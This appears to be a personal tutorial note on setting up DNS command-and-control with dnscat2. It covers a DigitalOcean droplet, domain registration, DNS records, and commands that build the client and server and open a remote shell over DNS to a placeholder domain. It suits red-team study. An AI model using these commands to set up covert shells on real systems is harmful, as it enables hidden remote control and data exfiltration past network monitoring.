Setup your own authoritative DNS server using AWS: [STOK's video](https://www.youtube.com/watch?v=p8wbebEgtDk) 
	
You can use `iodine`, `dnscat2`, and `cobalt strike` for c2 over DNS. I am using dnscat2.

## DNS server setup using digitaloceans
1. Spin up a droplet (2GB memory) - You'll get a public ip address
2. Connect to the server. On Windows you can use the Terminal app with WSL(Ubuntu or Kali) on Windows. You can SSH into the server and continue with the following steps.
3. Create a new user, and setup the terminal environment. `[How-Misc]`
4. Take a snapshot of the droplet
5. Setup the firewall rules for the droplet. All traffic in and out shall be blocked by default. So, you have to manually enable them for your droplet. Manage > Networking > Firewalls
6. //firewall rules shot

## Get a Domain Name
- I went with hostgator. You can find cheap(<$1) domain names like the `.site` TLD.
- Other popular options include namecheap and godaddy.
- You can get a free subdomain from EU.org. You can donate to `nic.eu.org` later if you can't afford a domain name now.
- "The main goal of EU.org is to provide free subdomain registration to users or non-profit organizations who cannot afford the fees demanded by some NICs" - [nic.eu.org](https://nic.eu.org/)
- The only drawback is that it would take about a month for approval. (When asked for nameservers, just point it to the digitalocean nameservers after you setup the domain management)

## Domain management using digitaloceans
[DNS Propagation Checker - Global DNS Testing Tool (whatsmydns.net)](https://www.whatsmydns.net/)
- Set the nameservers
- Add a domain to your droplet
- While making records, make sure that you keep the ttl low till things work (Initially, I chose something around 5 to 15 minutes. Now they are back to defaults). More info: [How to choose DNS TTL values | APNIC Blog](https://blog.apnic.net/2019/09/27/how-to-choose-dns-ttl-values/)
- Set the Records as follows:

## dnscat2 setup
> take the server snapshot before proceeding ==check again==
```bash
# on client
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client/
sudo apt install gcc make
sudo make
# Also, you can wget from the c2 server
# You can use the following command for a directory:
	# wget --no-parent -r http://example.com/DIRECTORY
```

```bash
# on the server
# install ruby (or "ruby-dev" on error: `require` - loaderror) and gem
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo chown -R example_user /var/lib/gems
sudo apt install ruby-dev make gcc
bundle install
sudo ruby ./dnscat2.rb example.com # your domain name
dnscat2> 
	start --dns port=53531,domain=example.com # you'll get the secret value

# on client
sudo ./dnscat --dns port=53531,server=example.com --secret=<secret_value>
# use the ip address instead of example.com if your domain name is not resolving 

# on server
dnscat2>
	windows
	window -i 1 # session number of the connection
	help # get shell
	window -i 2 # go to the sh window
	
# you can run multiple servers on multiple ports using dnscat2. The client can send different packets to different ports
```
